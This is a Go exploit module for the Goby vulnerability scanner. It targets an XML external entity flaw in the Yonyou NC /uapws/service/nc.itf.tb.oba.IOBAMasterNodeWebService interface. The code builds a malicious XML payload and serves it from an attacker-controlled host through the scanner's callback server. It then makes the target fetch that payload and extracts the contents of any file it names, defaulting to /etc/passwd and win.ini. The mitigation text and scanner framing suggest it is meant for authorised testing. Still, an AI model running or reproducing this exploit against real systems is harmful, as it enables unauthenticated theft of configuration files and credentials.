package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "yonyou-NC /nc.itf.tb.oba.IOBAMasterNodeWebService File Read Vulnerability",
    "Description": "<p>Yonyou NC is a large-scale enterprise digital platform developed by Yonyou Network Technology Co., Ltd.  </p><p>There is an XML entity injection vulnerability in the Yonyou NC /nc.itf.tb.oba.IOBAMasterNodeWebService interface, through which an unauthenticated attacker can read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure website.</p>",
    "Product": "yonyou-NC-OA-V5.72SP1",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2024-03-15",
    "PostTime": "2024-11-27",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "(body=\"UFIDA\" && body=\"logo/images/\") || (body=\"logo/images/ufida_nc.png\") || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\")",
    "GobyQuery": "(body=\"UFIDA\" && body=\"logo/images/\") || (body=\"logo/images/ufida_nc.png\") || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\")",
    "Level": "1",
    "Impact": "<p>There is an XML entity injection vulnerability in the Yonyou NC /nc.itf.tb.oba.IOBAMasterNodeWebService interface, through which an unauthenticated attacker can read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure website.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/136353908"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "passwd,win.ini,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "file:///c://windows/win.ini",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "用友 NC /nc.itf.tb.oba.IOBAMasterNodeWebService 文件读取漏洞",
            "Product": "用友NC-OA-V5.72SP1",
            "Description": "<p>用友 NC 是用友网络科技股份有限公司开发的一款大型企业数字化平台。&nbsp;</p><p>用友 NC /nc.itf.tb.oba.IOBAMasterNodeWebService 接口存在XML实体注入漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>用友 NC /nc.itf.tb.oba.IOBAMasterNodeWebService 接口存在XML实体注入漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "yonyou-NC /nc.itf.tb.oba.IOBAMasterNodeWebService File Read Vulnerability",
            "Product": "yonyou-NC-OA-V5.72SP1",
            "Description": "<p>Yonyou NC is a large-scale enterprise digital platform developed by Yonyou Network Technology Co., Ltd.&nbsp;&nbsp;</p><p>There is an XML entity injection vulnerability in the Yonyou NC /nc.itf.tb.oba.IOBAMasterNodeWebService interface, through which an unauthenticated attacker can read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure website.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is an XML entity injection vulnerability in the Yonyou NC /nc.itf.tb.oba.IOBAMasterNodeWebService interface, through which an unauthenticated attacker can read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9974"
}`

	postOrGet_dhufgaygfaghyufguidatdafgyatgyusdfagtwegqgafgykjute := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		//文件名为随机8位字符
		filename := goutils.RandomHexString(8) + ".xml"
		fileContent := `<?xml version="1.0"?><!DOCTYPE test [<!ENTITY name SYSTEM "` + fileUrl + `">]><user><username>&name;</username><password>1</password></user>`
		//filename 是上传文件名，fileContent是上传文件内容，fileURL是上传文件的路径后续目标请求这个路径
		err := godclient.HostFile(filename, fileContent, func(fileURL string) error {

			// 定义正则表达式模式
			pattern := `([\s\S]*)i([\s\S]*)`
			// 编译正则表达式
			re := regexp.MustCompile(pattern)
			if !re.MatchString(fileURL) {
				return errors.New(`not match`)
			}
			match := re.FindStringSubmatch(fileURL)
			// 在文本中查找匹配项
			containsIP := func(s string) bool {
				pattern := `(\d{1,3}\.){3}\d{1,3}`
				// 编译正则表达式
				re := regexp.MustCompile(pattern)
				if !re.MatchString(match[1]) {
					return false
				}
				return true
			}
			if !containsIP(match[1]) {
				// 判断match[1]中是否含有数字
				fileURL = "http://" + godclient.GetGodServerIP() + "/i" + match[2]
			}
			urlGet := "/uapws/service/nc.itf.tb.oba.IOBAMasterNodeWebService?xsd=" + fileURL
			requestConfig := httpclient.NewGetRequestConfig(urlGet)
			requestConfig.VerifyTls = false
			requestConfig.FollowRedirect = false
			resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
			if err != nil || resp.StatusCode != 200 {
				err = errors.New("failed to read file")
				return err
			}

			// 定义正则表达式模式
			pattern = `<username>((.|\n)*?)</username>`
			// 编译正则表达式
			re = regexp.MustCompile(pattern)
			if !re.MatchString(resp.RawBody) {
				return errors.New(`not match`)
			}
			// 在文本中查找匹配项
			match = re.FindStringSubmatch(resp.RawBody)
			respTxt = match[1]
			return nil
		})
		if err != nil {
			return "", err
		}
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/uapws/service/nc.itf.tb.oba.IOBAMasterNodeWebService"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"file:///etc/passwd":          "root:",
				"file:///c://windows/win.ini": "[extensions]",
			}
			// 函数继承
			uploadFileFunc := postOrGet_dhufgaygfaghyufguidatdafgyatgyusdfagtwegqgafgykjute

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"passwd":  {"file:///etc/passwd", "root:"},
				"win.ini": {"file:///c://windows/win.ini", "[extensions]"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_dhufgaygfaghyufguidatdafgyatgyusdfagtwegqgafgykjute

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
